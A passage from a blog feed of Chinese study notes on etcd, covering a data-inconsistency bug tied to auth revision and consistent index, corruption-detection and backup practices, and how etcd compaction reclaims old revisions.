class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ApplyEntryNormal apples an EntryNormal type Raftpb request to the EtcdServer</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> （<span class="hljs-title">s</span> *<span class="hljs-title">EtcdServer</span>） <span class="hljs-title">ApplyEntryNormal</span>（<span class="hljs-title">e</span> *<span class="hljs-title">Raftpb</span>.<span class="hljs-title">Entry</span>）</span> &#123;<br>   shouldApplyV3 := <span class="hljs-literal">false</span><br>   <span class="hljs-keyword">if</span> e.Index &gt; s.consistIndex.ConsistentIndex（） &#123;<br>      <span class="hljs-comment">// set the consistent index of current executing entry</span><br>      s.consistIndex.setConsistentIndex（e.Index）<br>      shouldApplyV3 = <span class="hljs-literal">true</span><br>   &#125;<br>   <span class="hljs-keyword">defer</span> s.setAppliedIndex（e.Index）<br>   ....<br> &#125;<br><br></code></pre></td></tr></table></figure><p>而三个节点revision差异偏离标准值，恰好又说明异常etcd节点可能未成功应用日志条目到MVCC模块。我们也可以通过查看MVCC的相关metrics（比如etcd_mvcc_put_total），来排除请求是否到了MVCC模块，事实是丢数据节点的metrics指标值的确远远落后正常节点。</p><p>于是将真凶锁定在Apply流程上。对Apply流程在未向MVCC模块提交请求前可能提前返回的地方，都加了日志。</p><p>同时查看Apply流程还发现，Apply失败的时候并不会打印任何日志。这也解释了为什么出现了数据不一致严重错误，但三个etcd节点却并没有任何异常日志。为了方便定位问题，我们因此增加了Apply错误日志。</p><p>同时测试发现，写入是否成功还跟client连接的节点有关，连接不同节点会出现不同的写入结果，用debug版本替换后，马上就输出了一条错误日志auth: revision in header is old。</p><p>原来数据不一致是因为鉴权版本号不一致导致的，节点在Apply流程的时候，会判断Raft日志条目中的请求鉴权版本号是否小于当前鉴权版本号，如果小于就拒绝写入。</p><p>那为什么各个节点的鉴权版本号会出现不一致呢？那就需要从可能修改鉴权版本号的源头分析。我们发现只有鉴权相关接口才会修改它，同时各个节点鉴权版本号之间差异已经固定不再增加，要成功解决就得再次复现。</p><p>然后还了解到，当时etcd进程有过重启，我们怀疑会不会重启触发了什么Bug，手动尝试复现一直失败。随后基于混沌工程，不断模拟真实业务场景、访问鉴权接口、注入故障（停止etcd进程等），最终功夫不负有心人，实现复现成功。</p><p>真相终于浮出水面，原来当你无意间重启etcd的时候，如果最后一条命令是鉴权相关的，它并不会持久化consistent index（KV接口会持久化）。consistent index、它具有幂等作用，可防止命令重复执行。consistent index的未持久化最终导致鉴权命令重复执行。</p><p>恰好鉴权模块的RoleGrantPermission接口未实现幂等，重复执行会修改鉴权版本号。一连串的Bug最终导致鉴权号出现不一致，随后又放大成MVCC模块的key-value数据不一致，导致严重的数据毁坏。</p><p>这个Bug影响etcd v3所有版本长达3年之久。查清楚问题后，我们也给社区提交了解决方案，合并到master后，同时cherry-pick到etcd 3.3和3.4稳定版本中。etcd v3.3.21和v3.4.8后的版本已经修复此Bug。</p><h2 id="为什么会不一致"><a href="#为什么会不一致" class="headerlink" title="为什么会不一致"></a>为什么会不一致</h2><p>详细了解完这个案例的不一致后，再从本质上深入分析下为什么会出现不一致，以及还有哪些场景会导致类似问题呢？</p><p>首先我们知道，etcd各个节点数据一致性基于Raft算法的日志复制实现的，etcd是个基于复制状态机实现的分布式系统。下图是分布式复制状态机原理架构，核心由3个组件组成，一致性模块、日志、状态机，其工作流程如下：</p><ul><li>client发起一个写请求（set x &#x3D; 3）；</li><li>server向一致性模块（假设是Raft）提交请求，一致性模块生成一个写提案日志条目。若server是Leader，把日志条目广播给其他节点，并持久化日志条目到WAL中；</li><li>当一半以上节点持久化日志条目后，Leader的一致性模块将此日志条目标记为已提交（committed），并通知其他节点提交；</li><li>server从一致性模块获取已经提交的日志条目，异步应用到状态机持久化存储中（boltdb等），然后返回给client。</li></ul><p><img src="https://static001.geekbang.org/resource/image/5c/4f/5c7a3079032f90120a6b309ee401fc4f.png?wh=605*319" alt="img"></p><p>从图中我们可以了解到，在基于复制状态机实现的分布式存储系统中，Raft等一致性算法它只能确保各个节点的日志一致性，也就是图中的流程二。</p><p>而对于流程三来说，server从日志里面获取已提交的日志条目，将其应用到状态机的过程，跟Raft算法本身无关，属于server本身的数据存储逻辑。</p><p><strong>也就是说有可能存在server应用日志条目到状态机失败，进而导致各个节点出现数据不一致。但是这个不一致并非Raft模块导致的，它已超过Raft模块的功能界限。</strong></p><p>比如在上面Node莫名其妙消失的案例中，就是应用日志条目到状态机流程中，出现逻辑错误，导致key-value数据未能持久化存储到boltdb。</p><p>这种逻辑错误即便重试也无法解决，目前社区也没有彻底的根治方案，只能根据具体案例进行针对性的修复。同时社区增加了Apply日志条目失败的警告日志。</p><h2 id="其他典型不一致Bug"><a href="#其他典型不一致Bug" class="headerlink" title="其他典型不一致Bug"></a>其他典型不一致Bug</h2><p>还有哪些场景可能还会导致Apply流程失败呢？之前升级etcd 3.2集群到3.3集群时，遇到的数据不一致的故障事件为例。</p><p>这个故障对外的表现也是令人摸不着头脑，有服务不调度的、有service下的endpoint不更新的。最终经过一番排查发现，原来数据不一致是由于etcd 3.2和3.3版本Lease模块的Revoke Lease行为不一致造成。</p><p>etcd 3.2版本的RevokeLease接口不需要鉴权，而etcd 3.3 RevokeLease接口增加了鉴权，因此当你升级etcd集群的时候，如果etcd 3.3版本收到了来自3.2版本的RevokeLease接口，就会导致因为没权限出现Apply失败，进而导致数据不一致，引发各种诡异现象。</p><p>除了重启etcd、升级etcd可能会导致数据不一致，defrag操作也可能会导致不一致。</p><p>对一个defrag碎片整理来说，它是如何触发数据不一致的呢？ 触发的条件是defrag未正常结束时会生成db.tmp临时文件。这个文件可能包含部分上一次defrag写入的部分key&#x2F;value数据，。而etcd下次defrag时并不会清理它，复用后就可能会出现各种异常场景，如重启后key增多、删除的用户数据key再次出现、删除user&#x2F;role再次出现等。</p><p>etcd 3.2.29、etcd 3.3.19、etcd 3.4.4后的版本都已经修复这个Bug。我建议你根据自己实际情况进行升级，否则踩坑后，数据不一致的修复工作是非常棘手的，风险度极高。</p><p>从以上三个案例里，我们可以看到， <strong>算法一致性不代表一个庞大的分布式系统工程实现中一定能保障一致性，工程实现上充满着各种挑战，从不可靠的网络环境到时钟、再到人为错误、各模块间的复杂交互等，几乎没有一个存储系统能保证任意分支逻辑能被测试用例100%覆盖。</strong></p><p>复制状态机在给我们带来数据同步的便利基础上，也给我们上层逻辑开发提出了高要求。也就是说任何接口逻辑变更etcd需要保证兼容性，否则就很容易出现Apply流程失败，导致数据不一致。</p><p>同时除了Apply流程可能导致数据不一致外，我们从defrag案例中也看到了一些维护变更操作，直接针对底层存储模块boltdb的，也可能会触发Bug，导致数据不一致。</p><h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><p>在了解了etcd数据不一致的风险和原因后，在实践中有哪些方法可以提前发现和规避不一致问题呢？</p><p>分别是：</p><ul><li>开启etcd的数据毁坏检测功能；</li><li>应用层的数据一致性检测；</li><li>定时数据备份；</li><li>良好的运维规范（比如使用较新稳定版本、确保版本一致性、灰度变更）。</li></ul><h3 id="开启etcd的数据毁坏检测功能"><a href="#开启etcd的数据毁坏检测功能" class="headerlink" title="开启etcd的数据毁坏检测功能"></a>开启etcd的数据毁坏检测功能</h3><p>首先介绍下etcd的数据毁坏检测功能。etcd不仅支持在启动的时候，通过–experimental-initial-corrupt-check参数检查各个节点数据是否一致，也支持在运行过程通过指定–experimental-corrupt-check-time参数每隔一定时间检查数据一致性。</p><p>那么它的一致性检测原理是怎样的？如果出现不一致性，etcd会采取什么样动作去降低数据不一致影响面呢？</p><p>其实就是想确定boltdb文件里面的内容跟其他节点内容是否一致。因此可以枚举所有key value，然后比较即可。</p><p>etcd的实现也就是通过遍历treeIndex模块中的所有key获取到版本号，然后再根据版本号从boltdb里面获取key的value，使用crc32 hash算法，将bucket name、key、value组合起来计算它的hash值。</p><p>如果开启了–experimental-initial-corrupt-check，启动的时候每个节点都会去获取peer节点的boltdb hash值，然后相互对比，如果不相等就会无法启动。</p><p>而定时检测是指Leader节点获取它当前最新的版本号，并通过Raft模块的ReadIndex机制确认Leader身份。当确认完成后，获取各个节点的revision和boltdb hash值，若出现Follower节点的revision大于Leader等异常情况时，就可以认为不一致，发送corrupt告警，触发集群corruption保护，拒绝读写。</p><p>从etcd上面的一致性检测方案我们可以了解到，目前采用的方案是比较简单、暴力的。因此可能随着数据规模增大，出现检测耗时增大等扩展性问题。而DynamoDB等使用了merkle tree来实现增量hash检测，这也是etcd未来可能优化的一个方向。</p><p>最后你需要特别注意的是，etcd数据毁坏检测的功能目前还是一个试验(experimental)特性，在比较新的版本才趋于稳定、成熟（推荐v3.4.9以上），预计在未来的etcd 3.5版本中才会变成稳定特性，因此etcd 3.2&#x2F;3.3系列版本就不能使用此方案。</p><h3 id="应用层的数据一致性检测"><a href="#应用层的数据一致性检测" class="headerlink" title="应用层的数据一致性检测"></a>应用层的数据一致性检测</h3><p>那要如何给etcd 3.2&#x2F;3.3版本增加一致性检测呢? 其实除了etcd自带数据毁坏检测，还可以通过在应用层通过一系列方法来检测数据一致性，它们适用于etcd所有版本。</p><p>接下来讲讲应用层检测的原理。</p><p>从上面对数据不一致性案例的分析中，我们知道数据不一致在MVCC、boltdb会出现很多种情况，比如说key数量不一致、etcd逻辑时钟版本号不一致、MVCC模块收到的put操作metrics指标值不一致等等。因此我们的应用层检测方法就是基于它们的差异进行巡检。</p><p>首先针对key数量不一致的情况，我们可以实现巡检功能，定时去统计各个节点的key数，这样可以快速地发现数据不一致，从而及时介入，控制数据不一致影响，降低风险。</p><p>在统计节点key数时，记得查询的时候带上WithCountOnly参数。etcd从treeIndex模块获取到key数后就及时返回了，无需访问boltdb模块。如果你的数据量非常大（涉及到百万级别），那即便是从treeIndex模块返回也会有一定的内存开销，因为它会把key追加到一个数组里面返回。</p><p>而在WithCountOnly场景中，我们只需要统计key数即可。因此我给社区提了优化方案，目前已经合并到master分支。对百万级别的key来说，WithCountOnly时内存开销从数G到几乎零开销，性能也提升数十倍。</p><p>其次可以基于endpoint各个节点的revision信息做一致性监控。一般情况下，各个节点的差异是极小的。</p><p>最后还可以基于etcd MVCC的metrics指标来监控。比如上面提到的mvcc_put_total，理论上每个节点这些MVCC指标是一致的，不会出现偏离太多。</p><h3 id="定时数据备份"><a href="#定时数据备份" class="headerlink" title="定时数据备份"></a>定时数据备份</h3><p>etcd数据不一致的修复工作极其棘手。发生数据不一致后，各个节点可能都包含部分最新数据和脏数据。如果最终我们无法修复，那就只能使用备份数据来恢复了。</p><p>因此备份特别重要，备份可以保障我们在极端场景下，能有保底的机制去恢复业务。 <strong>请记住，在做任何重要变更前一定先备份数据，以及在生产环境中建议增加定期的数据备份机制（比如每隔30分钟备份一次数据）。</strong></p><p>可以使用开源的etcd-operator中的backup-operator去实现定时数据备份，它可以将etcd快照保存在各个公有云的对象存储服务里面。</p><h3 id="良好的运维规范"><a href="#良好的运维规范" class="headerlink" title="良好的运维规范"></a>良好的运维规范</h3><p>最后介绍几个运维规范，这些规范可以帮助我们尽量少踩坑（即便你踩坑后也可以控制故障影响面）。</p><p>首先是确保集群中各节点etcd版本一致。若各个节点的版本不一致，因各版本逻辑存在差异性，这就会增大触发不一致Bug的概率。比如我们前面提到的升级版本触发的不一致Bug就属于此类问题。</p><p>其次是优先使用较新稳定版本的etcd。像上面我们提到的3个不一致Bug，在最新的etcd版本中都得到了修复。你可以根据自己情况进行升级，以避免下次踩坑。同时你可根据实际业务场景以及安全风险，来评估是否有必要开启鉴权，开启鉴权后涉及的逻辑更复杂，有可能增大触发数据不一致Bug的概率。</p><p>最后是你在升级etcd版本的时候，需要多查看change log，评估是否存在可能有不兼容的特性。在你升级集群的时候注意先在测试环境多验证，生产环境务必先灰度、再全量。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>从消失的Node案例为例，介绍了etcd中定位一个复杂不一致问题的思路和方法工具。核心就是根据我们对etcd读写原理的了解，对每个模块可能出现的问题进行大胆猜想。</p><p>同时我们要善于借助日志、metrics、etcd tool等进行验证排除。定位到最终模块问题后，如果很难复现，可以借助混沌工程等技术注入模拟各类故障。 <strong>遇到复杂Bug时，请永远不要轻言放弃，它一定是一个让你快速成长的机会。</strong></p><p>其次我介绍了etcd数据不一致的核心原因：Raft算法只能保证各个节点日志同步的一致性，但Apply流程是异步的，它从一致性模块获取日志命令，应用到状态机的准确性取决于业务逻辑，这块是没有机制保证的。</p><p>同时，defrag等运维管理操作，会直接修改底层存储数据，异常场景处理不严谨也会导致数据不一致。</p><p>数据不一致的风险是非常大的，轻则业务逻辑异常，重则核心数据丢失。我们需要机制去提前发现和规避它，因此最后我详细给你总结了etcd本身和应用层的一致性监控、定时备份数据、良好的运维规范等若干最佳实践，这些都是宝贵的实践总结，希望你能有所收获。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11.压缩：如何回收旧版本数据？</title>
    <link href="/2022/10/06/11-%E5%8E%8B%E7%BC%A9%EF%BC%9A%E5%A6%82%E4%BD%95%E5%9B%9E%E6%94%B6%E6%97%A7%E7%89%88%E6%9C%AC%E6%95%B0%E6%8D%AE%EF%BC%9F/"/>
    <url>/2022/10/06/11-%E5%8E%8B%E7%BC%A9%EF%BC%9A%E5%A6%82%E4%BD%95%E5%9B%9E%E6%94%B6%E6%97%A7%E7%89%88%E6%9C%AC%E6%95%B0%E6%8D%AE%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="11-压缩：如何回收旧版本数据？"><a href="#11-压缩：如何回收旧版本数据？" class="headerlink" title="11.压缩：如何回收旧版本数据？"></a>11.压缩：如何回收旧版本数据？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>在之前的介绍中，我们知道etcd中的每一次更新、删除key操作，treeIndex的keyIndex索引中都会追加一个版本号，在boltdb中会生成一个新版本boltdb key和value。也就是随着不停更新、删除，etcd进程内存占用和db文件就会越来越大。很显然，这会导致etcd OOM和db大小增长到最大db配额，最终不可写。</p><p>那么etcd是通过什么机制来回收历史版本数据，控制索引内存占用和db大小的呢？</p><p>这就是今天要分享的etcd压缩机制。能帮助你理解etcd压缩原理，在使用etcd过程中能根据自己的业务场景，选择适合的压缩策略，避免db大小增长失控而不可写入，帮助你构建稳定的etcd服务。</p><h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h2><p><img src="https://static001.geekbang.org/resource/image/7c/21/7c5d5212fa14yy6aaf843ae3dfc5f721.png?wh=1920*918" alt="img"></p><p>在了解etcd压缩模块实现细节前，先了解压缩模块的整体架构图。从图中可知，可以通过client API发起人工的压缩(Compact)操作，也可以配置<strong>自动压缩策略</strong>。在自动压缩策略中，可以根据业务场景选择合适的压缩模式。目前etcd支持两种压缩模式，分别是<strong>时间周期性压缩和版本号压缩</strong>。</p><p>当你通过API发起一个Compact请求后，KV Server收到Compact请求提交到Raft模块处理，在Raft模块中提交后，<strong>Apply模块就会通过MVCC模块的Compact接口执行此压缩任务</strong>。</p><p>Compact接口首先会更新当前server已压缩的版本号，并将耗时昂贵的压缩任务保存到FIFO队列中异步执行。压缩任务执行时，它首先会压缩treeIndex模块中的keyIndex索引，其次会遍历boltdb中的key，删除已废弃的key。</p><p>以上就是压缩模块的一个工作流程。接下来首先介绍如何人工发起一个Compact操作，然后详细介绍周期性压缩模式、版本号压缩模式的工作原理，最后再给你介绍Compact操作核心的原理。</p><h2 id="压缩特性初体验"><a href="#压缩特性初体验" class="headerlink" title="压缩特性初体验"></a>压缩特性初体验</h2><p>在使用etcd过程中，当你遇到”etcdserver: mvcc: database space exceeded”错误时，若是你未开启压缩策略导致db大小达到配额，这时可以使用etcdctl compact命令，主动触发压缩操作，回收历史版本。</p><p>如下所示，可以先通过endpoint status命令获取etcd当前版本号，然后再通过etcdctl compact命令发起压缩操作即可。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># 获取etcd当前版本号<br>$ rev=$(etcdctl endpoint status --write-out=&quot;json&quot; | egrep -o &#x27;&quot;revision&quot;:[0<span class="hljs-string">-9</span>]*&#x27; | egrep -o &#x27;[0<span class="hljs-string">-9</span>].*&#x27;)<br>$ echo $rev<br>9<br># 执行压缩操作，指定压缩的版本号为当前版本号<br>$ etcdctl compact $rev<br>Compacted revision 9<br># 压缩一个已经压缩的版本号<br>$ etcdctl compact $rev<br><span class="hljs-keyword">Error: </span>etcdserver: mvcc: required revision has been compacted<br># 压缩一个比当前最大版号大的版本号<br>$ etcdctl compact 12<br><span class="hljs-keyword">Error: </span>etcdserver: mvcc: required revision is a future revision<br><br></code></pre></td></tr></table></figure><p>请注意，如果你压缩命令传递的版本号小于等于当前etcd server记录的压缩版本号，etcd server会返回已压缩错误(“mvcc: required revision has been compacted”)给client。如果版本号大于当前etcd server最新的版本号，etcd server则返回一个未来的版本号错误给client(“mvcc: required revision is a future revision”)。</p><p>执行压缩命令的时候，不少初学者有一个常见的误区，就是担心压缩会不会把我最新版本数据给删除？</p><p>压缩的本质是 <strong>回收历史版本</strong>，目标对象仅是 <strong>历史版本</strong>，不包括一个key-value数据的最新版本，因此你可以放心执行压缩命令，不会删除你的最新版本数据。不过介绍Watch机制时提到，Watch特性中的历史版本数据同步，依赖于MVCC中是否还保存了相关数据，因此建议不要每次简单粗暴地回收所有历史版本。</p><p>在生产环境中，建议精细化的控制历史版本数，那如何实现精细化控制呢？</p><p>主要有两种方案，<strong>一种是使用etcd server的自带的自动压缩机制</strong>，根据你的业务场景，配置合适的压缩策略即可。</p><p>另外一种方案是如果你觉得etcd server的自带压缩机制无法满足你的诉求，想更精细化的控制etcd保留的历史版本记录，你就可以基于etcd的Compact API，<strong>在业务逻辑代码中、或定时任务中主动触发压缩操作</strong>。你需要确保发起Compact操作的程序高可用，压缩的频率、保留的历史版本在合理范围内，并最终能使etcd的db 大小保持平稳，否则会导致db大小不断增长，直至db配额满，无法写入。</p><p>在一般情况下，建议使用etcd自带的压缩机制。它支持两种模式，分别是按<strong>时间周期性压缩和保留版本号的压缩</strong>，配置相应策略后，etcd节点会自动化的发起Compact操作。</p><p>接下来详细介绍下etcd的周期性和保留版本号压缩模式。</p><h2 id="周期性压缩"><a href="#周期性压缩" class="headerlink" title="周期性压缩"></a>周期性压缩</h2><p>首先是周期性压缩模式，它适用于什么场景呢？</p><p>当希望etcd只保留最近一段时间写入的历史版本时，就可以选择配置etcd的压缩模式为periodic，保留时间为你自定义的1h等。</p><p>如何给etcd server配置压缩模式和保留时间呢?</p><p>如下所示，etcd server提供了配置压缩模式和保留时间的参数：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nsis">--<span class="hljs-literal">auto</span>-compaction-retention <span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-literal">Auto</span> compaction retention length. <span class="hljs-number">0</span> means disable <span class="hljs-literal">auto</span> Compaction.<br>--<span class="hljs-literal">auto</span>-compaction-mode <span class="hljs-string">&#x27;periodic&#x27;</span><br>Interpret <span class="hljs-string">&#x27;auto-Compaction-retention&#x27;</span> one of: periodic|revision.<br><br></code></pre></td></tr></table></figure><p>auto-compaction-mode为periodic时，它表示启用时间周期性压缩，auto-compaction-retention为保留的时间的周期，比如1h。</p><p>auto-compaction-mode为revision时，它表示启用版本号压缩模式，auto-compaction-retention为保留的历史版本号数，比如10000。</p><p>注意，etcd server的auto-compaction-retention为’0’时，将关闭自动压缩策略，</p><p>那么周期性压缩模式的原理是怎样的呢？ etcd是如何知道你配置的1h前的etcd server版本号呢？</p><p>其实非常简单，etcd server启动后，根据你的配置的模式periodic，会创建periodic Compactor，它会异步的获取、记录过去一段时间的版本号。periodic Compactor组件获取你设置的压缩间隔参数1h， 并将其划分成10个区间，也就是每个区间6分钟。每隔6分钟，它会通过etcd MVCC模块的接口获取当前的server版本号，追加到rev数组中。</p><p>因为只需要保留过去1个小时的历史版本，periodic Compactor组件会通过当前时间减去上一次成功执行Compact操作的时间，如果间隔大于一个小时，它会取出rev数组的首元素，通过etcd server的Compact接口，发起压缩操作。</p><p>需要注意的一点是，在etcd v3.3.3版本之前，不同的etcd版本对周期性压缩的行为是有一定差异的，具体的区别你可以参考下 <a href="https://github.com/etcd-io/etcd/blob/v3.4.9/Documentation/op-guide/maintenance.md">官方文档</a>。</p><h2 id="版本号压缩"><a href="#版本号压缩" class="headerlink" title="版本号压缩"></a>版本号压缩</h2><p>了解完周期性压缩模式，我们再看看版本号压缩模式，它又适用于什么场景呢？</p><p>当写请求比较多，可能产生比较多的历史版本导致db增长时，或者不确定配置periodic周期为多少才是最佳的时候，你可以通过设置压缩模式为<strong>revision</strong>，<strong>指定保留的历史版本号数</strong>。比如你希望etcd尽量只保存1万个历史版本，那么你可以指定compaction-mode为revision，auto-compaction-retention为10000。</p><p>它的实现原理又是怎样的呢?</p><p>也很简单，etcd启动后会根据你的压缩模式revision，创建revision Compactor。revision Compactor会根据你设置的保留版本号数，每隔5分钟定时获取当前server的最大版本号，减去你想保留的历史版本数，然后通过etcd server的Compact接口发起如下的压缩操作即可。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta"># 获取当前版本号，减去保留的版本号数</span><br><span class="hljs-built_in">rev</span> := rc.rg.<span class="hljs-built_in">Rev</span>() - rc.retention<br><span class="hljs-meta"># 调用server的Compact接口压缩</span><br>_，err := rc.c.<span class="hljs-built_in">Compact</span>(rc.ctx，&amp;pb.CompactionRequest&#123;Revision: <span class="hljs-built_in">rev</span>&#125;)<br><br></code></pre></td></tr></table></figure><h2 id="压缩原理"><a href="#压缩原理" class="headerlink" title="压缩原理"></a>压缩原理</h2><p>介绍完两种自动化的压缩模式原理后，接下来就深入分析下压缩的本质。当etcd server收到Compact请求后，它是如何执行的呢？ 核心原理是什么？</p><p>如前面的整体架构图所述，Compact请求经过Raft日志同步给多数节点后，etcd会从Raft日志取出Compact请求，应用此请求到状态机执行。</p><p>执行流程如下图所示，MVCC模块的Compact接口首先会检查Compact请求的版本号rev是否已被压缩过，若是则返回ErrCompacted错误给client。其次会检查rev是否大于当前etcd server的最大版本号，若是则返回ErrFutureRev给client，这就是我们上面执行etcdctl compact命令所看到的那两个错误原理。</p><p>通过检查后，Compact接口会通过boltdb的API在meta bucket中更新当前已调度的压缩版本号(scheduledCompactedRev)号，然后将压缩任务追加到FIFO Scheduled中，异步调度执行。</p><p><img src="https://static001.geekbang.org/resource/image/9a/ff/9ac55d639f564b56324b96dc02f0c0ff.png?wh=1920*1332" alt="img"></p><p>为什么Compact接口需要持久化存储当前已调度的压缩版本号到boltdb中呢？</p><p>试想下如果不保存这个版本号，etcd在异步执行的Compact任务过程中crash了，那么异常节点重启后，各个节点数据就会不一致。</p><p>因此etcd通过持久化存储scheduledCompactedRev，节点crash重启后，会重新向FIFO Scheduled中添加压缩任务，已保证各个节点间的数据一致性。</p><p>异步的执行压缩任务会做哪些工作呢？</p><p>首先之前介绍的treeIndex索引模块，它是etcd支持保存历史版本的核心模块，每个key在treeIndex模块中都有一个keyIndex数据结构，记录其历史版本号信息。</p><p><img src="https://static001.geekbang.org/resource/image/4f/dc/4f9cb015a842da0d5bd556d6b45970dc.png?wh=1920*1124" alt="img"></p><p>如上图所示，因此异步压缩任务的第一项工作，就是 <strong>压缩treeIndex模块中的各key的历史版本</strong>、已删除的版本。为了避免压缩工作影响读写性能，首先会克隆一个B-tree，然后通过克隆后的B-tree遍历每一个keyIndex对象，压缩历史版本号、清理已删除的版本。</p><p>假设当前压缩的版本号是CompactedRev， 它会保留keyIndex中最大的版本号，移除小于等于CompactedRev的版本号，并通过一个map记录treeIndex中有效的版本号返回给boltdb模块使用。</p><p>为什么要保留最大版本号呢?</p><p>因为最大版本号是这个key的最新版本，移除了会导致key丢失。而Compact的目的是回收旧版本。当然如果keyIndex中的最大版本号被打了删除标记(tombstone)， 就会从treeIndex中删除这个keyIndex，否则会出现内存泄露。</p><p>Compact任务执行完索引压缩后，它通过遍历B-tree、keyIndex中的所有generation获得当前内存索引模块中有效的版本号，这些信息将帮助etcd清理boltdb中的废弃历史版本。</p><p><img src="https://static001.geekbang.org/resource/image/d6/70/d625753e5a7f0f7f37987764b9204270.png?wh=1920*1129" alt="img"></p><p>压缩任务的第二项工作就是 <strong>删除boltdb中废弃的历史版本数据</strong>。如上图所示，它通过etcd一个名为scheduleCompaction任务来完成。</p><p>scheduleCompaction任务会根据key区间，从0到CompactedRev遍历boltdb中的所有key，通过treeIndex模块返回的有效索引信息，判断这个key是否有效，无效则调用boltdb的delete接口将key-value数据删除。</p><p>在这过程中，scheduleCompaction任务还会更新当前etcd已经完成的压缩版本号(finishedCompactRev)，将其保存到boltdb的meta bucket中。</p><p>scheduleCompaction任务遍历、删除key的过程可能会对boltdb造成压力，为了不影响正常读写请求，它在执行过程中会通过参数控制每次遍历、删除的key数（默认为100，每批间隔10ms），分批完成boltdb key的删除操作。</p><h2 id="为什么压缩后db大小不减少呢"><a href="#为什么压缩后db大小不减少呢" class="headerlink" title="为什么压缩后db大小不减少呢?"></a>为什么压缩后db大小不减少呢?</h2><p>当你执行完压缩任务后，db大小减少了吗？ 事实是并没有减少。那为什么我们都通过boltdb API删除了key，db大小还不减少呢？</p><p>之前介绍boltdb实现时，提到过boltdb将db文件划分成若干个page页，page页又有四种类型，分别是meta page、branch page、leaf page以及freelist page。branch page保存B+ tree的非叶子节点key数据，leaf page保存bucket和key-value数据，freelist会记录哪些页是空闲的。</p><p><strong>当我们通过boltdb删除大量的key，在事务提交后B+ tree经过分裂、平衡，会释放出若干branch&#x2F;leaf page页面，然而boltdb并不会将其释放给磁盘，调整db大小操作是昂贵的，会对性能有较大的损害。</strong></p><p>boltdb是通过freelist page记录这些空闲页的分布位置，当收到新的写请求时，优先从空闲页数组中申请若干连续页使用，实现高性能的读写（而不是直接扩大db大小）。当连续空闲页申请无法得到满足的时候， boltdb才会通过增大db大小来补充空闲页。</p><p>一般情况下，压缩操作释放的空闲页就能满足后续新增写请求的空闲页需求，db大小会趋于整体稳定。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>etcd压缩操作可通过API人工触发，也可以配置压缩模式由etcd server自动触发。压缩模式支持按周期和版本两种。在周期模式中你可以实现保留最近一段时间的历史版本数，在版本模式中你可以实现保留期望的历史版本数。</p><p>压缩的核心工作原理分为两大任务，第一个任务是压缩treeIndex中的各key历史索引，清理已删除key，并将有效的版本号保存到map数据结构中。</p><p>第二个任务是删除boltdb中的无效key。基本原理是根据版本号遍历boltdb已压缩区间范围的key，通过treeIndex返回的有效索引map数据结构判断key是否有效，无效则通过boltdb API删除它。</p><p>最后在执行压缩的操作中，虽然我们删除了boltdb db的key-value数据，但是db大小并不会减少。db大小不变的原因是存放key-value数据的branch和leaf页，它们释放后变成了空闲页，并不会将空间释放给磁盘。</p><p>boltdb通过freelist page来管理一系列空闲页，后续新增的写请求优先从freelist中申请空闲页使用，以提高性能。在写请求速率稳定、新增key-value较少的情况下，压缩操作释放的空闲页就可以基本满足后续写请求对空闲页的需求，db大小就会处于一个基本稳定、健康的状态。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>10.boltdb：如何持久化存储你的key-value数据？</title>
    <link href="/2022/10/05/10-boltdb%EF%BC%9A%E5%A6%82%E4%BD%95%E6%8C%81%E4%B9%85%E5%8C%96%E5%AD%98%E5%82%A8%E4%BD%A0%E7%9A%84key-value%E6%95%B0%E6%8D%AE%EF%BC%9F/"/>
    <url>/2022/10/05/10-boltdb%EF%BC%9A%E5%A6%82%E4%BD%95%E6%8C%81%E4%B9%85%E5%8C%96%E5%AD%98%E5%82%A8%E4%BD%A0%E7%9A%84key-value%E6%95%B0%E6%8D%AE%EF%BC%9F/</url>
    
